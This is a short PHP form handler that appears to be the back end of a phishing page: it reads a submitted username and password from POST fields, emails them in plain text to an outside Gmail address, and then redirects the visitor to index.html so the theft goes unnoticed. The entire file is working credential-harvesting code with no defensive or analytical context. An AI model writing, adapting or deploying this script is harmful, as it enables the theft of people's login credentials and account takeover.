<?php
$name = $_POST['uname'];
$pass = $_POST['psw'];

$email_from = 'boeingnot@gmail.com';

$email_subject = 'test';

$email_body = "username: $name password: $pass";

$to = "filmroyalp@gmail.com";

$headers = "From: $email_from \r\n";

$headers .= "Reply-To: $visitor_email \r\n";

mail($to,$email_subject,$email_body,$headers);

header("location: index.html")
?>
